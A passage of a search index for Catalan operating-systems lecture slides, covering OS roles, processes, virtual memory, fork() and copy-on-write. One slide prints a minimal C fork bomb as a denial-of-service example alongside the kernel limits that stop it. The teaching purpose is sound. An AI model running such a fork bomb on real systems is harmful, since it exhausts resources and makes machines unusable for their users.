    "text": "Quins són els rols SO? (I)\nIl·lusionista\nOfereix una interfície simple i fàcil d’utilitzar per als recursos físics d’una màquina o sistema, ocultant la complexitat tècnica.\n\n\n\n\n\n\n\nExemple\n\n\nPermet als usuaris utilitzar una impressora (hardware) sense conèixer els detalls tècnics d’aquesta impresora, com la interfície de comunicació, els controladors o els protocols de comunicació, disposem d’una funció (imprimir) que ens permet enviar un document a la impressora.\n\n\n\n\n\nEl sistema operatiu actua com un il·lusionista que ens ofereix una interfície simple i fàcil d’utilitzar per als recursos físics d’una màquina o sistema, ocultant la complexitat tècnica. Per exemple, quan utilitzem una impressora, no necessitem conèixer els detalls tècnics d’aquesta impressora, com la interfície de comunicació, els controladors o els protocols de comunicació. En canvi, podem utilitzar una funció simple com “imprimir” que ens permet enviar un document a la impressora sense preocupar-nos pels detalls tècnics. Això fa que l’ús de la tecnologia sigui més accessible i fàcil per als usuaris.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 · Introducció als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#quins-són-els-rols-so-ii",
    "href": "slides/01-introduction.html#quins-són-els-rols-so-ii",
    "title": "Introducció",
    "section": "Quins són els rols SO? (II)",
    "text": "Quins són els rols SO? (II)\nIl·lusionista\nProporciona una abstracció que permet a una aplicació tenir ús exclusiu dels recursos quan sigui necessari, sense interferències d’altres aplicacions.\n\n\n\n\n\n\n\nExemple\n\n\nPermet utilitzar un programa de videoconferència que utilitza la càmera i el micròfon i ens garantitza que cap altre programa pugui utiltizar-los al mateix temps.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 · Introducció als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#quins-són-els-rols-so-iii",
    "href": "slides/01-introduction.html#quins-són-els-rols-so-iii",
    "title": "Introducció",
    "section": "Quins són els rols SO? (III)",
    "text": "Quins són els rols SO? (III)\nIl·lusionista\nOferir una il·lusió d’infinitat per als recursos de maquinari, assegurant que les aplicacions puguin continuar funcionant sense problemes.\n\n\n\n\n\n\n\nExemple\n\n\n\nPermet a un usuari tenir múltiples aplicacions obertes alhora, tot i que només una estigui en primer pla.\n\nCrea una il·lusió on cada procés creu que és propietari dels recursos hardware.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 · Introducció als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#quins-són-els-rols-so-v",
    "href": "slides/01-introduction.html#quins-són-els-rols-so-v",
    "title": "Introducció",
    "section": "Quins són els rols SO? (V)",
    "text": "Quins són els rols SO? (V)\nÀrbitre\nResponsable de distribuir els recursos disponibles entre usuaris i aplicacions de manera eficient i justa.\n\n\n\n\n\n\n\nExemple\n\n\nUn sistema amb múltiples usuaris, el temps de processador s’ha de repartir de manera equitativa entre tots els usuaris que executen aplicacions.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 · Introducció als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#quins-són-els-rols-so-vi",
    "href": "slides/01-introduction.html#quins-són-els-rols-so-vi",
    "title": "Introducció",
    "section": "Quins són els rols SO? (VI)",
    "text": "Quins són els rols SO? (VI)\nÀrbitre\nGaranteix la segregació i la protecció d’usuaris i aplicacions.\n\n\n\n\n\n\n\nExemple\n\n\nImpedint que una aplicació bloquegi o afecti el funcionament d’altres aplicacions.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 · Introducció als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#quins-són-els-rols-so-vii",
    "href": "slides/01-introduction.html#quins-són-els-rols-so-vii",
    "title": "Introducció",
    "section": "Quins són els rols SO? (VII)",
    "text": "Quins són els rols SO? (VII)\nPega\nProporciona un conjunt de serveis i funcionalitats comunes que poden ser compartits i reutilitzats per diverses parts d’un sistema.\n\nCompartició: Simplifica \\(\\Rightarrow\\) s’assumeixen sempre les mateixes primitives bàsiques.\nReutilització: Evita torna a implementar funcionalitats comunes. Permet evolucionar de forma independent els components.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 · Introducció als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#el-sistema-de-fitxers",
    "href": "slides/01-introduction.html#el-sistema-de-fitxers",
    "title": "Introducció",
    "section": "El Sistema de Fitxers",
    "text": "El Sistema de Fitxers\nUn exemple de la funció de pega del sistema operatiu és el sistema de fitxers:\n\nProporciona una interfície estàndard per a la creació, lectura, escriptura i eliminació de fitxers de format transparent (read, write, open, close, …)\nEns permet implementar libc que proporciona funcions d’entrada/sortida d’alt nivell (fopen, fread, fwrite, fclose, …)",
    "crumbs": [
      "Diapositives",
      "Unitat 01 · Introducció als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#anàlisi-què-fa-aquest-programa-i",
    "href": "slides/01-introduction.html#anàlisi-què-fa-aquest-programa-i",
    "title": "Introducció",
    "section": "Anàlisi: Què fa aquest programa? (I)",
    "text": "Anàlisi: Què fa aquest programa? (I)\n\n\n\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nint main(int argc, \n    char *argv[])\n{\n  while(1)\n  {\n    printf(\"%s\\n\", argv[1]);\n  }\n  return 0\n}\n\n./prog H\n\nH  H  …\n\n\n./prog H & ./prog O\n???",
    "crumbs": [
      "Diapositives",
      "Unitat 01 · Introducció als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#anàlisi-què-fa-aquest-programa-ii",
    "href": "slides/01-introduction.html#anàlisi-què-fa-aquest-programa-ii",
    "title": "Introducció",
    "section": "Anàlisi: Què fa aquest programa? (II)",
    "text": "Anàlisi: Què fa aquest programa? (II)\n\n\nEn primer lloc, el programa c s’ha de compilar amb un compilador i enllaçar amb les llibreries del sistema que ens proporciona el sistema operatiu.\nUn cop tenim un executable, si l’executem el sistema operatiu crearà una estructura anomenada procés on es guardarà un identificador, un espai de memòria,… aquesta estructura és una de les abstraccions essencials per la funció d’il·lusionisme.\nFixeu-vos que el mateix programa pot ser executat dos cops i el sistema operatiu generarà 2 processos diferents. Amb identificadors diferents i espai de memoria diferent.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 · Introducció als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#anàlisi-què-fa-aquest-programa-iii",
    "href": "slides/01-introduction.html#anàlisi-què-fa-aquest-programa-iii",
    "title": "Introducció",
    "section": "Anàlisi: Què fa aquest programa? (III)",
    "text": "Anàlisi: Què fa aquest programa? (III)\n\n\nPer tant, el sistema operatiu utilitzant el planificador assignarà el processador (assumimim que només tenim 1 core) a 1 procés durant un temps determinat i anirà intercanviant (canvi de context) aquest procés cada X temps, d’aquesta manera cada procés creu tenir tots els recursos per ells (il·lusió).",
    "crumbs": [
      "Diapositives",
      "Unitat 01 · Introducció als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#anàlisi-què-fa-aquest-programa-iv",
    "href": "slides/01-introduction.html#anàlisi-què-fa-aquest-programa-iv",
    "title": "Introducció",
    "section": "Anàlisi: Què fa aquest programa? (IV)",
    "text": "Anàlisi: Què fa aquest programa? (IV)\n\n\nPer fer-ho, el sistema operatiu guardà una foto de l’estat actual del procés a memòria i la recuperarà més endavant quan li torni a donar dret d’execució.\nNoteu també que s’ha creat en mèmoria una subregió independent per cada procés. Quan un procés intenta accedir una zona de memòria forà de la seva subregió o inexistent es dona el famós SEGMENTATION FAULT.\nCom en l’últim exemple on el procés intenta accedir a una zona de memòria que no li pertany. Això és una de les funcions de protecció que ens ofereix el sistema operatiu. Al llarg del curs veurem amb més detall com funcionen tots aquests mecanismes.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 · Introducció als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#anàlisi-què-fa-aquest-programa-v",
    "href": "slides/01-introduction.html#anàlisi-què-fa-aquest-programa-v",
    "title": "Introducció",
    "section": "Anàlisi: Què fa aquest programa? (V)",
    "text": "Anàlisi: Què fa aquest programa? (V)\n\n\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nint main(int argc, \n    char *argv[])\n{\n  while(1)\n  {\n    printf(\"%s\\n\", argv[1]);\n  }\n  return 0\n}\n\nDepenen de la prioritat dels procesesos A o B poden tenir més temps de CPU que l’altre i sortir els missatges de forma desordenada.\n./prog H & ./prog O\n\n\n\n\nH  H  H  …\n\nH  O  H  …\n\nO  O  H  …",
    "crumbs": [
      "Diapositives",
      "Unitat 01 · Introducció als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#anàlisi-què-fa-aquest-programa-vi",
    "href": "slides/01-introduction.html#anàlisi-què-fa-aquest-programa-vi",
    "title": "Introducció",
    "section": "Anàlisi: Què fa aquest programa? (VI)",
    "text": "Anàlisi: Què fa aquest programa? (VI)\n\n\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nint main(int argc, \n    char *argv[])\n{\n  while(1)\n  {\n    printf(\"%s\\n\", argv[1]);\n  }\n  return 0\n}\n\n./prog & ; ./prog O\n?????",
    "crumbs": [
      "Diapositives",
      "Unitat 01 · Introducció als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#anàlisi-què-fa-aquest-programa-vii",
    "href": "slides/01-introduction.html#anàlisi-què-fa-aquest-programa-vii",
    "title": "Introducció",
    "section": "Anàlisi: Què fa aquest programa? (VII)",
    "text": "Anàlisi: Què fa aquest programa? (VII)\n\n\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nint main(int argc, \nchar *argv[])\n{\n  while(1)\n  {\n    printf(\"%s\\n\", argv[1]);\n  }\n  return 0\n}\n\n./prog & ; ./prog O\nSegmentation Fault  O  O  …",
    "crumbs": [
      "Diapositives",
      "Unitat 01 · Introducció als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#anàlisi-què-fa-aquest-programa-viii",
    "href": "slides/01-introduction.html#anàlisi-què-fa-aquest-programa-viii",
    "title": "Introducció",
    "section": "Anàlisi: Què fa aquest programa? (VIII)",
    "text": "Anàlisi: Què fa aquest programa? (VIII)\n\n\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;unistd.h&gt;\n\nint main(int argc, char *argv[])\n{\n  int *p = malloc(sizeof(int));\n  printf(\"p: %p\\n\", p);\n  int i = 1;\n  while (1) {\n    *p = i;\n    printf(\"(%d) p: %d\\n\", getpid(), *p);\n    i++;\n  }\n  free(p);\n  return 0;\n}\n\n./prog1\n\n(611) p: 0x5570014a02a0\n(611) p: 1\n(611) p: 2\n(611) p: 3\n(611) p: 4\n\n\n./prog1 & ./prog1\n????",
    "crumbs": [
      "Diapositives",
      "Unitat 01 · Introducció als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#anàlisi-què-fa-aquest-programa-ix",
    "href": "slides/01-introduction.html#anàlisi-què-fa-aquest-programa-ix",
    "title": "Introducció",
    "section": "Anàlisi: Què fa aquest programa? (IX)",
    "text": "Anàlisi: Què fa aquest programa? (IX)\n\n\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;unistd.h&gt;\n\nint main(int argc, char *argv[])\n{\n  int *p = malloc(sizeof(int));\n  printf(\"p: %p\\n\", p);\n  int i = 1;\n  while (1) {\n    *p = i;\n    printf(\"(%d) p: %d\\n\", getpid(), *p);\n    i++;\n  }\n  free(p);\n  return 0;\n}\n\nAquest programa crea un procés que reserva memòria dinàmica per a un enter i imprimeix l’adreça de memòria i el valor de l’enter en un bucle infinit. Si executem aquest programa dues vegades en paral·lel, cada procés tindrà la seva pròpia còpia de la variable p i, per tant, les adreces de memòria seran diferents. Això és gràcies a la memòria virtual que ens proporciona el sistema operatiu, que aïlla els processos entre si i els permet utilitzar les mateixes adreces de memòria sense interferir-se. El %p en la funció printf s’utilitza per imprimir l’adreça de memòria en format hexadecimal veure més informació sobre els especificadors de format en C a printf.\n\n./prog1 & ./prog1\n(611) p: 0x5570014a02a0\n(612) p: 0x5570014a02a0\n(611) p: 1\n(612) p: 1\n(611) p: 2\n(612) p: 2\n\n\n\n\n\n\n\nExplicació\n\n\nLes adreçes virtuals protegeixen els processosos entre ells i permeten que tots dos processos puguin fer servir la mateixa adreça sense afectar-se.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 · Introducció als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#reptes-en-el-disseny-dels-so-i",
    "href": "slides/01-introduction.html#reptes-en-el-disseny-dels-so-i",
    "title": "Introducció",
    "section": "Reptes en el disseny dels SO (I)",
    "text": "Reptes en el disseny dels SO (I)\n\nComplexitat de la programació distribuïda (concurrent i paral·lela).\nComplexitat pel context (mòbil, IoT, servidors, centres de dades, …).\nComplexitat per la gran varietat d’elements de maquinari (heterogeneïtat).\nComplexitat en la portabilitat i la compatibilitat.\nEquilibri entre funcionalitat i rendiment.\nEquilibri entre rendiment i ús d’energia.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 · Introducció als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#reptes-en-el-disseny-dels-so-ii",
    "href": "slides/01-introduction.html#reptes-en-el-disseny-dels-so-ii",
    "title": "Introducció",
    "section": "Reptes en el disseny dels SO (II)",
    "text": "Reptes en el disseny dels SO (II)\n\nMaximitzar la fiabilitat: Els sistemes han de fer el que estan dissenyats per fer en tots els casos, fins i tot en cas d’errors inesperats.\nMaximitzar la disponibilitat: Els sistemes han d’estar disponibles per a l’ús quan els usuaris ho necessiten, minimitzant el temps d’aturada i reparació causat per fallades.\nSeguretat: Els sistemes han de protegir-se contra accions malicioses i accidents involuntaris.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 · Introducció als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#exemples-de-disseny-so-i",
    "href": "slides/01-introduction.html#exemples-de-disseny-so-i",
    "title": "Introducció",
    "section": "Exemples de Disseny SO (I)",
    "text": "Exemples de Disseny SO (I)\nVehicle\n\nUn vehicle autònom ha de ser segur per als passatgers i per a la gent que hi ha al seu voltant. Ha de garantir que el vehicle no es pugui controlar de forma remota per un atacant. També ha de ser tolerant a fallades i recuperar-se d’errors sense posar en perill la seguretat dels passatgers.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 · Introducció als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#reptes-en-el-disseny-dels-so-iii",
    "href": "slides/01-introduction.html#reptes-en-el-disseny-dels-so-iii",
    "title": "Introducció",
    "section": "Reptes en el disseny dels so (III)",
    "text": "Reptes en el disseny dels so (III)\n\nEscalables: Els sistemes han de funcionar bé quan s’afegeixen recursos (usuaris, processos, …) o quan es redueixen.\nMantenibles: Els sistemes han de ser fàcils de mantenir i evolucionar al llarg del temps.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 · Introducció als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#exemples-de-disseny-so-i-1",
    "href": "slides/01-introduction.html#exemples-de-disseny-so-i-1",
    "title": "Introducció",
    "section": "Exemples de Disseny SO (I)",
    "text": "Exemples de Disseny SO (I)\nTelèfon mòbil\n\nEscalable perquè el nombre d’usuaris pot augmentar molt ràpidament.\nMantenible perquè els usuaris esperen actualitzacions periòdiques del sistema operatiu.\nA més a més, aquestes actualitzacions s’han de poder instal·lar de forma transparent i sense afectar el funcionament del telèfon.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 · Introducció als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#per-què-estudiar-so-i",
    "href": "slides/01-introduction.html#per-què-estudiar-so-i",
    "title": "Introducció",
    "section": "Per què estudiar SO? (I)",
    "text": "Per què estudiar SO? (I)\n\nSón la base dels sistemes informàtics. (IoT, Servidors, Mòbils, PC, …).\nEns permeten entendre com funciona realment un sistema informàtic.\nEls conceptes són aplicables a altres sistemes i problemes quotidians (planificació de tasques).\nOptimitzar el rendiment de les aplicacions.\nCompendre les vulnerabilitats, proteccions i mitigacions de riscos de seguretat.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 · Introducció als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#per-què-estudiar-so-ii",
    "href": "slides/01-introduction.html#per-què-estudiar-so-ii",
    "title": "Introducció",
    "section": "Per què estudiar SO? (II)",
    "text": "Per què estudiar SO? (II)\n\n\nLa comprensió en les decisions de disseny dels sistemes operatius i el raonament sobre els pros/contra us permetrà rescatar idees obsoletes que poden ser útils en el futur dels nous sistemes informàtics.\n\n\nEn particular, sovint passa que un canvi en la tecnologia fa que alguns idea obsoleta i ràpidament desapareix. No obstant això, un altre canvi tecnològic podria tornar-lo a reviure. Això és especialment cert quan el canvi té a veure amb el rendiment relatiu de les diferents parts del sistema. Per exemple, quan les CPUs es van fer molt més ràpides que les Memòries les caches van gaunyar molta importancia, però que passa si en un futur les memòries són molt més ràpides que les CPUs? En aquest cas, les caches ja no serien necessàries. En biologia, l’extinció és per sempre, però en informàtica, de vegades només és per uns quants anys.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 · Introducció als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#conclusions",
    "href": "slides/01-introduction.html#conclusions",
    "title": "Introducció",
    "section": "Conclusions",
    "text": "Conclusions\n\nEls sistemes operatius estan presents en tots els dispositius que fem servir.\nEl disseny es complex i requereix integrar dispositius diferents (forma,espai,temps).\nEns proporciones una il·lusió d’una màquina virtual infinita.\nÉs il·lusionista, árbrit i proporciona un conjunt de serveis comuns per permetre la interacció entre programari i maquinari.\nTé cura del rendiment, seguretat, portabilitat i fiabilitat.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 · Introducció als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#això-és-tot-per-avui",
    "href": "slides/01-introduction.html#això-és-tot-per-avui",
    "title": "Introducció",
    "section": "Això és tot per avui",
    "text": "Això és tot per avui\n\n\nPreguntes?\n\nTAKE HOME MESSAGE\nEls sistemes operatius ajuden als programadors a desenvolupar programari robust de forma independent del maquinari.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 · Introducció als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/03-create.html#mecanisme-de-creació-fork",
    "href": "slides/03-create.html#mecanisme-de-creació-fork",
    "title": "Creació de Processos a Linux",
    "section": "Mecanisme de Creació fork()",
    "text": "Mecanisme de Creació fork()\n\n\nfork() crea una còpia exacta del procés actual (el pare). Aquesta còpia esdevé el procés fill i s’executa independentment i simultàniament.\n#include &lt;sys/types.h&gt; # pid_t\n#include &lt;unistd.h&gt;    # fork()\nint main() {\n    pid_t pid = fork();\n    exit(0);\n}\n\n\n\n\n\n\n\nEspai de Memòria\n\n\nEls processos pare (A) i fill (B) no comparteixen espai de memòria. Cada procés té el seu propi espai d’adreces virtuals. No obstant això, el contingut inicial de la memòria del procés pare es copia a l’espai d’adreces del fill.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Creació de processos"
    ]
  },
  {
    "objectID": "slides/03-create.html#jerarquia-de-processos-fork",
    "href": "slides/03-create.html#jerarquia-de-processos-fork",
    "title": "Creació de Processos a Linux",
    "section": "Jerarquia de Processos · fork()",
    "text": "Jerarquia de Processos · fork()\nex1.c\n#include &lt;stdlib.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;sys/types.h&gt;\nint main() {\n    pid_t pid;\n    pid = fork();\n    sleep(20);\n    exit(0);\n}\n\nTerminal A\nwatch -n 1 \"ps -ef | grep ex1\"\n\nTerminal B\necho $$ && gcc ex1.c -o ex1 && ./ex1",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Creació de processos"
    ]
  },
  {
    "objectID": "slides/03-create.html#execució-independentfork",
    "href": "slides/03-create.html#execució-independentfork",
    "title": "Creació de Processos a Linux",
    "section": "Execució Independent:fork()",
    "text": "Execució Independent:fork()\n\n\n\n\n\n\n\n\n\nValors de retorn: fork()\n\n\n\nSi fork() té èxit:\n\nRetorna un valor \\(&gt;0\\) al procés pare (el PID del procés fill).\nRetorna 0 al procés fill.\n\n\n\n\n\n\n\n\n\n\n\n\n\nConsideracions\n\n\n\nSi fork() falla en el procés pare, retorna un valor \\(&lt;0\\) i el codi d’error es guarda a la variable errno.\nSi fork() falla, no es crea cap procés fill.\n\n\n\n\n\n\n\n\n\n\n\n\nObservacions\n\n\n\nLa instrucció exit(0) s’executa tant pel procés pare com pel fill.\nCada procés executa el seu propi printf de manera independent.\n\n\n\n\n\n\nex2.c\n#include &lt;stdio.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;errno.h&gt;\nint main() {\n    pid_t pid = fork();\n    if (pid == 0) {\n        printf(\"Hello, I am the child.\\n\");\n    } else if (pid &gt; 0) {\n        printf(\"Hello I am the father.\\n\");\n    } else {\n        perror(\"Error creating process\");\n    }\n    exit(0);\n}\n\nExecució\ngcc ex2.c -o ex2 && ./ex2",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Creació de processos"
    ]
  },
  {
    "objectID": "slides/03-create.html#registres-i-fork",
    "href": "slides/03-create.html#registres-i-fork",
    "title": "Creació de Processos a Linux",
    "section": "Registres i fork()",
    "text": "Registres i fork()\n\n\n\n\n\n\n\nsequenceDiagram\n    participant P as Pare\n    participant K as Kernel\n    participant C as Fill\n\n    Note over P: Estat abans de fork()&lt;br&gt;RAX = ?, PC = adreça_crida_fork\n    P-&gt;&gt;K: `fork()`\n    activate K\n    K--&gt;&gt;P: Retorn al Pare:&lt;br&gt;RAX = Child PID &lt;br&gt;PC = adreça_següent_instrucció\n    K--&gt;&gt;C: Retorn al Fill:&lt;br&gt;RAX = 0&lt;br&gt;PC = adreça_següent_instrucció\n    deactivate K\n\n    par Execució paral·lela des del mateix punt\n        P--&gt;&gt;P: Pare: Continua l'execució.(`if (RAX &gt; 0)`)\n        C--&gt;&gt;C: Fill: Continua l'execució.(`if (RAX == 0)`)\n    end\n\n    Note over P,C: Ambdós processos s'executen de manera independent\n\n\n\n\n\n\n\n\n\n\n\n\nsequenceDiagram\n    participant P as Pare\n    participant K as Kernel\n\n    Note over P: Estat abans de fork()&lt;br&gt;RAX = ?, PC = adreça_crida_fork\n    P-&gt;&gt;K: `fork()`\n    activate K\n   \n    alt Error a `fork()`\n        P--xK: Retorna al pare:&lt;br&gt;RAX = -1\n        Note over P: `errno` s'estableix.\n    end\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nObservació\n\n\nA l’arquitectura x86, el registre RAX s’utilitza per emmagatzemar el valor de retorn de la crida al sistema fork(). En altres arquitectures, s’utilitzen registres equivalents (sovint R0 o X0).",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Creació de processos"
    ]
  },
  {
    "objectID": "slides/03-create.html#gestió-derrors-fork",
    "href": "slides/03-create.html#gestió-derrors-fork",
    "title": "Creació de Processos a Linux",
    "section": "Gestió d’errors: fork()",
    "text": "Gestió d’errors: fork()\n\n\n\n\n\n\n\n\nError\nDescripció\nRaons\n\n\n\n\nEAGAIN\nS’han assolit els límits del sistema.\n- Límits de processos (RLIMIT_NPROC)- Límits de fils (threads-max)- Esgotament dels PIDs disponibles (pid_max)- Límits de cgroup\n\n\nENOMEM\nMemòria del Kernel insuficient.\n- Escassetat de RAM o Swap- Problemes amb els espais de noms PID\n\n\nENOSYS\nfork() no és compatible.\n- Maquinari sense unitat de gestió de memòria (MMU)- SO no compatible amb fork()\n\n\nERESTARTNOINTR\nCrida interrompuda i reiniciada.\nIntern al Kernel, no és un error vist directament per l’aplicació.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Creació de processos"
    ]
  },
  {
    "objectID": "slides/03-create.html#forkbomb",
    "href": "slides/03-create.html#forkbomb",
    "title": "Creació de Processos a Linux",
    "section": "Forkbomb",
    "text": "Forkbomb\n\n\n\n\n\n\n\n\n\nQuè és una Forkbomb?\n\n\nA forkbomb és un atac de denegació de servei que crea ràpidament un nombre massiu de processos, sobrecarregant els recursos del sistema i fent-lo inoperable.\nint main() {\n    while (1) {\n        fork();\n    }\n\n\n\n\n\n\n\n\n\n\n\nMecanismes de Protecció\n\n\nEl nucli implementa dos mecanismes per prevenir les forkbombs:\n\nLímits de processos per usuari: Cada usuari té un límit configurable sobre el nombre de processos que pot crear, establert per ulimit -u.\nLímit global de processos: El sistema té un límit global sobre el nombre total de processos que pot crear, configurat per pid_max (típicament 32768).\n\n\n\n\n\n\n\n\n\n\n\nsequenceDiagram\n    participant P as Procés Forkbomb \n    participant K as Nucli (Kernel)\n    \n    P-&gt;&gt;K: fork() (1r intent)\n    activate K\n    K--&gt;&gt;P: Retorna PID del fill1\n    deactivate K\n    \n    par Creació Exponencial\n        P-&gt;&gt;K: fork() (2n intent)\n        activate K\n        K--&gt;&gt;P: Retorna PID del fill2\n        deactivate K\n        \n        fork1-&gt;&gt;K: fork() (1r fill)\n        activate K\n        K--&gt;&gt;fork1: Retorna PID del fill3\n        deactivate K\n    end\n    \n    Note over K: Processos creats: 4\n    \n    loop Fase de Saturació\n        P/fills-&gt;&gt;K: fork() (Nou intent)\n        activate K\n        alt Abans del límit\n            K--&gt;&gt;P/fills: Retorna nou PID\n        else Després del límit\n            K--&gt;&gt;P/fills: Retorna -1 (EAGAIN)\n        end\n        deactivate K\n    end\n    \n    Note over K: Estat Final:&lt;br&gt;- Límit de processos assolit&lt;br&gt;- CPU al 100%&lt;br&gt;- Nous forks bloquejats.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Creació de processos"
    ]
  },
  {
    "objectID": "slides/03-create.html#gestió-de-memòria-fork",
    "href": "slides/03-create.html#gestió-de-memòria-fork",
    "title": "Creació de Processos a Linux",
    "section": "Gestió de Memòria · fork()",
    "text": "Gestió de Memòria · fork()\n\n\n\n\n\n\n\n\n\n\n\nObservacions\n\n\n\nEn el moment de fork() \\(\\rightarrow\\) El pare i el fill comparteixen el mateix espai d’adreces físic.\nCada procés té el seu propi espai d’adreces virtual, que tradueix a l’espai d’adreces físic compartit.\n\n\n\n\n\n\n\n\n\n\n\n\nDuplicats idèntics\n\n\nInicialment, el pare i el fill són duplicats idèntics. A partir d’aquest moment, cada procés té el seu propi espai d’adreces virtual, i qualsevol modificació en un no afecta l’altre.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Creació de processos"
    ]
  },
  {
    "objectID": "slides/03-create.html#duplicació-rightarrow-independència",
    "href": "slides/03-create.html#duplicació-rightarrow-independència",
    "title": "Creació de Processos a Linux",
    "section": "Duplicació \\(\\rightarrow\\) Independència",
    "text": "Duplicació \\(\\rightarrow\\) Independència\n\n\nstatic int i = 11; //.data\nint main() {\n    int j= 22; // Stack\n    int *z = malloc(sizeof(int)); // Heap\n\n    pid_t pid;\n    switch (pid=fork())\n    {\n    case 0:\n        i *= 3; \n        j *= 3;\n        *z=44;\n        break;\n    default:\n        sleep(3);\n        *z=55;\n        break;\n    }\n \n    printf(\"PID=%ld %s data=%d stack=%d heap=%d\\n\", \n        (long) getpid(), \n        (pid == 0) ? \"(child) \" : \"(parent)\",i,j,*z);\n    free(z);\n    exit(0);\n}\n\n\n\n\n\n\nsequenceDiagram\n    participant P as Pare\n    participant OS as Kernel\n    participant C as Fill\n\n    Note over P: i=11, j=22, z=NULL\n    P-&gt;&gt;OS: `fork()`\n\n    par\n        C-&gt;&gt;OS: i *= 3 (.data) [i es converteix en 33]\n        activate OS\n        OS--&gt;&gt;C: Duplica Pàgina, Actualitza VMA\n        deactivate OS\n\n        C-&gt;&gt;OS: j *= 3 (stack) [j es converteix en 66]\n        activate OS\n        OS--&gt;&gt;C: Duplica Pàgina, Actualitza VMA\n        deactivate OS\n\n        C-&gt;&gt;OS: *z = 44 (heap) [z apunta a 44]\n        activate OS\n        OS--&gt;&gt;C: Duplica Pàgina, Actualitza VMA\n        deactivate OS\n    end\n\n    P-&gt;&gt;OS: *z = 55 (heap) [z apunta a 55]\n    activate OS\n    OS--&gt;&gt;P: Duplica Pàgina, Actualitza VMA\n    deactivate OS\n\n    C-&gt;&gt;C: Prints: data=33 stack=66 heap=44\n    P-&gt;&gt;P: Prints: data=11 stack=22 heap=55",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Creació de processos"
    ]
  },
  {
    "objectID": "slides/03-create.html#copy-on-write-cow",
    "href": "slides/03-create.html#copy-on-write-cow",
    "title": "Creació de Processos a Linux",
    "section": "Copy-On-Write (CoW)",
    "text": "Copy-On-Write (CoW)\n\n\n\n\n\n\n\nsequenceDiagram\n    participant P as Pare\n    participant M as Memòria\n    participant C as Fill\n\n    P-&gt;&gt;C: Crea Procés Fill\n    M-&gt;&gt;C: Comparteix Pàgina X\n\n\n    rect rgba(255, 200, 200, 0.2)\n    Note over P,C: Post-fork - Operació escriptura\n    P-&gt;&gt;M: Modifica Pàgina X\n    M-&gt;&gt;P: Crea còpia privada X' (RW)\n    M-&gt;&gt;C: Manté original X (RO)\n\n    end\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nCom funciona?\n\n\nQuan fork() crea un nou procés, el pare i el fill inicialment comparteixen les mateixes pàgines de memòria. Aquestes es marquen com a només lectura per a ambdós processos.\n\nCrea una còpia privada d’aquella pàgina per al procés que escriu.\nAssigna la nova pàgina amb permisos d’escriptura.\nManté la transparència per a l’aplicació.\n\nAquest mecanisme optimitza tant el temps com la memòria, ja que només es copia la informació modificada.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Creació de processos"
    ]
  },
  {
    "objectID": "slides/03-create.html#fork-or-clone",
    "href": "slides/03-create.html#fork-or-clone",
    "title": "Creació de Processos a Linux",
    "section": "fork() or clone()",
